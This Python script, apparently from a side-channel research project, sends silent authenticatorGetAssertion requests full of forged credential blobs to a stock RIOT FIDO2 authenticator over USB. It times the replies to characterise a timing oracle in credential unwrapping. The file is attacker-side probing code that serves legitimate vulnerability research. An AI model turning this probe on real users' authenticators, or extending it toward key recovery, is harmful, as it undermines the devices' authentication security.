#!/usr/bin/env python3
"""Arm B of the RIOT FIDO2 CTAP2 lead: the oracle as an attacker on the USB
cable actually sees it, against a STOCK RIOT authenticator.

The firmware is RIOT's own tests/sys/fido2_ctap_hid, unmodified -- see
demos/fido2_usb/victim/README.md.  Nothing here needs a debugger, a trigger pin
or a modified victim: it sends `authenticatorGetAssertion` over CTAPHID with an
allow list of forged credential blobs and times the reply.

Why that is an oracle at all (RIOT_PROTOCOLS.md section 1): RIOT unwraps every
allow-list entry in `_find_matching_rks` BEFORE the PIN check and BEFORE the
user-presence test, with an AES-CCM nonce taken from the attacker's own blob,
under a `cred_key` generated once and kept in flash for the device's life -- and
when the unwrap fails it still answers, `CTAP2_ERR_NO_CREDENTIALS`.

READ THIS BEFORE BELIEVING A NUMBER THIS SCRIPT PRINTS.  RIOT sets the HID
interrupt endpoints' bInterval to 5 (sys/usb/usbus/hid/hid.c:127,138), so on
full-speed USB the host polls for the reply on a 5 ms grid while one unwrap is
of order 1.5 ms of work.  Per-probe latency is therefore QUANTISED far above the
effect, and no single probe shows a microsecond-scale difference.

That is a lossy channel, not a wall.  The work still pushes the reply into a
later frame, so as long as the request phase wanders across the poll period the
EXPECTED frame count is linear in the work and averaging recovers it, at
(sigma/delta)^2 probes with sigma <= 5 ms/sqrt(12) ~ 1.44 ms.  Wi-SUN's clamp in
a genuinely-closed stack is a different shape; this is not that.

Two things follow, and they are why `grid` runs first:
  * --entries is an AMPLIFIER (each entry adds ~20 chosen-input block
    operations while the grid noise stays fixed), not a way to park the mean on
    a frame boundary -- one entry is ~1.5 ms, ~30 % of a grid period.
  * the phase has to WANDER.  Back-to-back requests can phase-lock to the poll
    grid, and a constant phase really would make this a threshold; `grid`'s
    histogram is what shows whether it is wandering, and --jitter-ms dithers it
    deliberately.

    python demos/fido2_usb/host/ctap_probe.py info
    python demos/fido2_usb/host/ctap_probe.py grid --n 200
    python demos/fido2_usb/host/ctap_probe.py sweep --entries 1 20 --repeat 50 \
        --npz demos/fido2_usb/host/ctap_entries_sweep.npz

Requires the `hid` package (present on this bench) -- NOT python-fido2: raw
CTAPHID framing is both one dependency fewer and one layer less between the
timestamp and the wire.
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import time

import numpy as np

try:
    import hid
except ImportError:  # pragma: no cover
    sys.exit("this needs the `hid` package (pip install hid)")

VID, PID = 0x1209, 0x7D01          # RIOT's USB_VID_TESTING / USB_PID_TESTING
REPORT = 64                        # CONFIG_USBUS_HID_INTERRUPT_EP_SIZE = 0x40
BROADCAST_CID = 0xFFFFFFFF
CMD_INIT = 0x86
CMD_CBOR = 0x90
CMD_KEEPALIVE = 0xBB
CMD_ERROR = 0xBF
CTAP_GET_ASSERTION = 0x02

# ctap_cred_id_t is packed {id[136], mac[16], nonce[13]} = 165 bytes, and
# _fido2_ctap_cbor_parse_cred_desc copies it with sizeof() as the bound, so a
# blob of any other length is rejected during parsing and never reaches the
# cipher.  The nonce is the last 13 bytes: that is the field the attacker steers.
# 164, not 165: sizeof(ctap_cred_id_t) IS 165, but RIOT copies the id with
# TinyCBOR's cbor_value_copy_byte_string into a 165-byte buffer and that helper
# wants len + 1 for a NUL.  164 is the largest length seen to be accepted on
# silicon; whether 165 can ever work is still open (instruments/ctaphost/README.md).
# The nonce is the last 13 bytes of the struct, so at 164 the final byte is not
# ours: 12 of the 13 nonce bytes are attacker-chosen.
CRED_ID_LEN = 164
NONCE_OFF, NONCE_LEN = 152, 12


# ---------------------------------------------------------------- CBOR writing
# Hand-rolled because the request is three fixed shapes and a dependency on a
# CBOR library would be a dependency on its encoding choices; RIOT's parser
# (TinyCBOR) accepts definite-length maps with small integer keys.
def _cbor_uint(major: int, n: int) -> bytes:
    if n < 24:
        return bytes([major << 5 | n])
    if n < 0x100:
        return bytes([major << 5 | 24, n])
    if n < 0x10000:
        return bytes([major << 5 | 25]) + struct.pack(">H", n)
    return bytes([major << 5 | 26]) + struct.pack(">I", n)


def _cbor_bytes(b: bytes) -> bytes:
    return _cbor_uint(2, len(b)) + b


def _cbor_text(s: str) -> bytes:
    return _cbor_uint(3, len(s.encode())) + s.encode()


def get_assertion_cbor(rp_id: str, client_data_hash: bytes,
                       cred_ids: list[bytes], up: bool = False) -> bytes:
    """authenticatorGetAssertion with `up` false -- silent authentication.

    up=false is what keeps the probe free of a button press.  RIOT honours it:
    the user-presence test at ctap.c:678 sits inside `if (req.options.up)`.
    """
    out = bytearray([CTAP_GET_ASSERTION])
    out += _cbor_uint(5, 4)                       # map(4)
    out += _cbor_uint(0, 1) + _cbor_text(rp_id)                # 1: rpId
    out += _cbor_uint(0, 2) + _cbor_bytes(client_data_hash)     # 2: clientDataHash
    out += _cbor_uint(0, 3) + _cbor_uint(4, len(cred_ids))      # 3: allowList
    for cid in cred_ids:
        # "id" BEFORE "type".  RIOT validates the whole request with
        # cbor_value_validate(..., CborValidateCanonicalFormat) before parsing a
        # single field (ctap_cbor.c:826), and canonical CBOR orders map keys by
        # encoded LENGTH first -- text(2) "id" precedes text(4) "type".  The wrong
        # order returns CTAP2_ERR_CBOR_PARSING (0x10) with no debug output at all.
        # Measured on silicon via instruments/ctaphost, not deduced.
        out += _cbor_uint(5, 2)                   # map(2)
        out += _cbor_text("id") + _cbor_bytes(cid)
        out += _cbor_text("type") + _cbor_text("public-key")
    out += _cbor_uint(0, 5) + _cbor_uint(5, 1)    # 5: options
    out += _cbor_text("up") + bytes([0xF5 if up else 0xF4])
    return bytes(out)


# --------------------------------------------------------------------- CTAPHID
class CtapHid:
    def __init__(self, path: bytes | None = None):
        self.d = hid.Device(path=path) if path else hid.Device(VID, PID)
        self.d.nonblocking = False
        self.cid = self._init_channel()

    def close(self) -> None:
        self.d.close()

    def _write_packets(self, cid: int, cmd: int, payload: bytes) -> None:
        first = payload[:REPORT - 7]
        pkt = struct.pack(">IBH", cid, cmd, len(payload)) + first
        self.d.write(pkt.ljust(REPORT, b"\0"))
        rest, seq = payload[len(first):], 0
        while rest:
            chunk, rest = rest[:REPORT - 5], rest[REPORT - 5:]
            self.d.write((struct.pack(">IB", cid, seq) + chunk).ljust(REPORT, b"\0"))
            seq += 1

    def _read_reply(self, cid: int, timeout_ms: int = 4000) -> tuple[int, bytes]:
        """Read one complete CTAPHID reply, skipping KEEPALIVE frames.

        KEEPALIVE is skipped but COUNTED by the caller's timing: a reply that
        needed a keepalive spent >100 ms in the authenticator, which for this
        workload means something other than the cipher happened.
        """
        while True:
            r = bytes(self.d.read(REPORT, timeout=timeout_ms))
            if not r:
                raise TimeoutError("no CTAPHID reply")
            rcid, cmd, blen = struct.unpack(">IBH", r[:7])
            if rcid != cid or not cmd & 0x80:
                continue
            if cmd == CMD_KEEPALIVE:
                continue
            data = bytearray(r[7:7 + min(blen, REPORT - 7)])
            while len(data) < blen:
                c = bytes(self.d.read(REPORT, timeout=timeout_ms))
                if not c:
                    raise TimeoutError("truncated CTAPHID reply")
                data += c[5:5 + min(blen - len(data), REPORT - 5)]
            return cmd, bytes(data)

    def _init_channel(self) -> int:
        nonce = os.urandom(8)
        self._write_packets(BROADCAST_CID, CMD_INIT, nonce)
        while True:
            cmd, data = self._read_reply(BROADCAST_CID)
            if cmd == CMD_INIT and data[:8] == nonce:
                return struct.unpack(">I", data[8:12])[0]

    def cbor(self, payload: bytes) -> tuple[int, bytes, int]:
        """Send a CBOR command and return (status, response, nanoseconds).

        The clock starts after the LAST write returns and stops when the first
        byte of the reply is in hand, which is the interval an attacker on the
        cable can measure.  It includes the host's own USB scheduling -- that is
        the point, and `grid` is what characterises it.
        """
        first = payload[:REPORT - 7]
        pkt = struct.pack(">IBH", self.cid, CMD_CBOR, len(payload)) + first
        self.d.write(pkt.ljust(REPORT, b"\0"))
        rest, seq = payload[len(first):], 0
        while rest:
            chunk, rest = rest[:REPORT - 5], rest[REPORT - 5:]
            self.d.write((struct.pack(">IB", self.cid, seq) + chunk).ljust(REPORT, b"\0"))
            seq += 1
        t0 = time.perf_counter_ns()
        cmd, data = self._read_reply(self.cid)
        t1 = time.perf_counter_ns()
        if cmd == CMD_ERROR:
            raise RuntimeError(f"CTAPHID error 0x{data[0]:02x}")
        return data[0], data[1:], t1 - t0


def forged_creds(n: int, rng: np.random.Generator, nonce: bytes | None = None) -> list[bytes]:
    """n credential blobs of the exact length RIOT's parser accepts.

    They are random, so their MICs fail -- which is the interesting case: the
    victim runs the whole CCM workload and then answers NO_CREDENTIALS.
    """
    out = []
    for _ in range(n):
        b = bytearray(rng.integers(0, 256, CRED_ID_LEN, dtype=np.uint8).tobytes())
        if nonce is not None:
            b[NONCE_OFF:NONCE_OFF + NONCE_LEN] = nonce
        out.append(bytes(b))
    return out


def cmd_info(args) -> int:
    for d in hid.enumerate(VID, PID):
        print(f"{d['path']!r} {d['manufacturer_string']} {d['product_string']} "
              f"usage_page=0x{d.get('usage_page', 0):04x}")
    dev = CtapHid()
    print(f"channel 0x{dev.cid:08x}")
    st, resp, ns = dev.cbor(bytes([0x04]))        # authenticatorGetInfo
    print(f"getInfo status=0x{st:02x} {len(resp)} bytes in {ns / 1e6:.3f} ms")
    dev.close()
    return 0


def _dither(args) -> None:
    """Randomise the gap before a request so its phase relative to the poll
    grid wanders.  Without this a tight loop can lock to the grid, which
    collapses the frame-count distribution to one mode and hides the effect."""
    if args.jitter_ms:
        time.sleep(np.random.random() * args.jitter_ms / 1000.0)


def cmd_grid(args) -> int:
    """Measure the quantisation before measuring anything through it.

    Prints the latency histogram and the spacing between its modes.  If the
    spacing is ~5 ms, that is bInterval = 5 showing up as promised and every
    later number has to be read as a frame count.
    """
    dev = CtapHid()
    rng = np.random.default_rng(args.seed)
    lat = np.empty(args.n)
    for i in range(args.n):
        _dither(args)
        creds = forged_creds(args.entries, rng)
        payload = get_assertion_cbor(args.rp_id, bytes(rng.integers(0, 256, 32, dtype=np.uint8)), creds)
        st, _, ns = dev.cbor(payload)
        lat[i] = ns / 1e6
        if st != 0x2E and i == 0:
            print(f"note: status 0x{st:02x} (0x2e = CTAP2_ERR_NO_CREDENTIALS, the expected one)")
    dev.close()

    print(f"entries={args.entries} n={args.n}: min {lat.min():.3f} ms "
          f"median {np.median(lat):.3f} max {lat.max():.3f} sd {lat.std():.3f}")
    edges = np.arange(np.floor(lat.min()), np.ceil(lat.max()) + 1, 0.5)
    hist, _ = np.histogram(lat, bins=edges)
    for e, h in zip(edges, hist):
        if h:
            print(f"  {e:7.1f} ms {'#' * min(h, 60)} {h}")
    modes = edges[:-1][hist > max(1, args.n // 50)]
    if len(modes) > 1:
        print(f"  mode spacing: {np.diff(modes)} ms "
              f"-- 5 ms means the reply is landing on the bInterval grid")
    return 0


def cmd_sweep(args) -> int:
    """Latency against allow-list length: the amplifier's gain curve.

    Each entry adds ~20 AES-128 block operations (9 CTR + 10 CBC-MAC + the MIC
    counter block over a 136-byte blob).  The SLOPE of this curve is the gain an
    attack gets for free from the allow list; the steps in it are the poll grid,
    and they are not the operating point (see the module docstring).
    """
    dev = CtapHid()
    rng = np.random.default_rng(args.seed)
    lo, hi = args.entries
    counts = np.arange(lo, hi + 1)
    lat = np.zeros((len(counts), args.repeat))
    status = np.zeros((len(counts), args.repeat), dtype=np.uint8)
    for i, n in enumerate(counts):
        for r in range(args.repeat):
            _dither(args)
            creds = forged_creds(int(n), rng)
            payload = get_assertion_cbor(
                args.rp_id, bytes(rng.integers(0, 256, 32, dtype=np.uint8)), creds)
            st, _, ns = dev.cbor(payload)
            lat[i, r] = ns / 1e6
            status[i, r] = st
        print(f"entries {n:3d}: median {np.median(lat[i]):8.3f} ms  "
              f"min {lat[i].min():8.3f}  max {lat[i].max():8.3f}  "
              f"status 0x{status[i, 0]:02x}")
    dev.close()
    if args.npz:
        np.savez_compressed(args.npz, counts=counts, latency_ms=lat, status=status,
                            repeat=np.uint32(args.repeat), seed=np.uint64(args.seed),
                            vid=np.uint16(VID), pid=np.uint16(PID),
                            note="stock RIOT tests/sys/fido2_ctap_hid; bInterval=5")
        print(f"wrote {args.npz}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--rp-id", default="example.com")
    ap.add_argument("--seed", type=int, default=20260923)
    ap.add_argument("--jitter-ms", type=float, default=7.0,
                    help="randomise the pre-request delay over [0, JITTER) ms so "
                         "the request phase does not lock to the 5 ms poll grid; "
                         "0 disables it, which is the arm to compare against")
    sub = ap.add_subparsers(dest="cmd", required=True)

    i = sub.add_parser("info", help="enumerate, open a channel, getInfo")
    i.set_defaults(fn=cmd_info)

    g = sub.add_parser("grid", help="characterise the USB latency quantisation")
    g.add_argument("--n", type=int, default=200)
    g.add_argument("--entries", type=int, default=1)
    g.set_defaults(fn=cmd_grid)

    s = sub.add_parser("sweep", help="latency vs allow-list length")
    s.add_argument("--entries", type=int, nargs=2, default=(1, 20),
                   metavar=("LO", "HI"),
                   help="RIOT caps the allow list at CTAP_MAX_EXCLUDE_LIST_SIZE = 20")
    s.add_argument("--repeat", type=int, default=50)
    s.add_argument("--npz", default=None)
    s.set_defaults(fn=cmd_sweep)

    args = ap.parse_args()
    return args.fn(args)


if __name__ == "__main__":
    raise SystemExit(main())
